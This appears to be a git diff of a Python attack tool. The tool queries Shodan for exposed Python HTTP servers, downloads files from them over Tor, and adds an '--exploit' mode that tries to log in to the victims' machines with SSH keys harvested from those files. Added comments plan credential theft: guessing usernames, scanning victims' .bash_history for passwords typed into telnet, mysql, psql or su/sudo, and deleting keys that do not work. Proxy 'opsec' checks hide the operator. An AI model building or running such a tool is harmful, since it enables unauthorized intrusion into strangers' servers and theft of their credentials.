@@ -12,7 +12,26 @@ from src.Target import Target
 from src.Download import Download
 from src.helper import *
 
-# create an automated way to download
+from executors import SSHTarget
+from parsers import get_all_targets
+
+# add in a processor that will look for ssh keys in the downloads directory
+# grab the ssh keys and attempt to auth via tor with your executor 
+# if successful write to the database username ssh key ip address port
+# if failed with root then see if there is a public key in the same directory 
+# cat the key and try to get a username, then try to auth with that
+# if that fails then try to auth with 10 or so common usernames
+# if all fails then remove the keys we dont want them anyways
+# add a size checker and if its above x dont download it
+
+# add some post processors that remove useless junk, going to be hard
+# might be able to test for different file types, not sure could remove the good stuff then too
+
+# can also add a .bash_history scanner that detects commands with likely passwords in them 
+# telnet 
+# mysql 
+# psql etc etc 
+# if we detect su or sudo (maybe look for misspellings of the word) we can grab what is after it to get a password that was entered as a mistake?
 
 def opsec_check(session: requests.Session):
     try:
@@ -25,6 +44,9 @@ def opsec_check(session: requests.Session):
     except requests.exceptions.ConnectTimeout as error:
         print(f"Connection timeout: {error}")
         sys.exit(6)
+    except requests.exceptions.ConnectionError as error:
+        print(f"Proxy connection failed, check your proxy")
+        sys.exit(7)
 
 def get_targets(proxy, verbose):
     conn = sqlite3.connect("db/database.db")
@@ -51,13 +73,23 @@ def get_download_targets(proxy, verbose):
             download_requests = Download(host, port, path, proxy=proxy, verbose=verbose)
             executor.submit(download_requests.do_download)
 
-def main(args):
-    banner()
-
+def log_program_execution() -> None:
     with open("runtime.log", "a") as fp:
         dt = datetime.now()
         format_date = dt.strftime("%Y-%m-%d %H:%M:%S")
         fp.write(f"started script {format_date}\n")
+
+def warning() -> bool:
+    print("[!] You are about to connect to targets without utilizing a proxy")
+    choice = input("[!] Are you sure you want to do that? [y/N]: ").strip().lower()
+    if choice in {"yes", "y"}:
+        return True
+    # be more inclusive with the no option
+    return False
+    
+
+def main(args):
+    banner()
 
     session = requests.Session()
     if args.tor:
@@ -86,6 +118,13 @@ def main(args):
         get_targets(args.tor, args.verbose)
         get_download_targets(args.tor, args.verbose)
 
+    if args.exploit:
+        if not args.tor:
+            if not warning():
+                return 
+        get_all_targets(args.tor)
+
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -94,8 +133,9 @@ if __name__ == "__main__":
     )
 
     action_group = parser.add_mutually_exclusive_group(required=True)
-    action_group.add_argument("-q", "--query", action="store_true")
-    action_group.add_argument("-s", "--scan", action="store_true")
+    action_group.add_argument("-q", "--query", help="Query the shodan api for exposed python http servers", action="store_true")
+    action_group.add_argument("-s", "--scan", help="Scan the exposed python http server and download interesting files", action="store_true")
+    action_group.add_argument("-e", "--exploit", help="Discover downloaded ssh keys and attempt to access the targets", action="store_true")
 
     parser.add_argument("-t", "--tor", help="SOCKS proxy ip:port", default=None)
     parser.add_argument("-p", "--port", help="Target port", required=False)
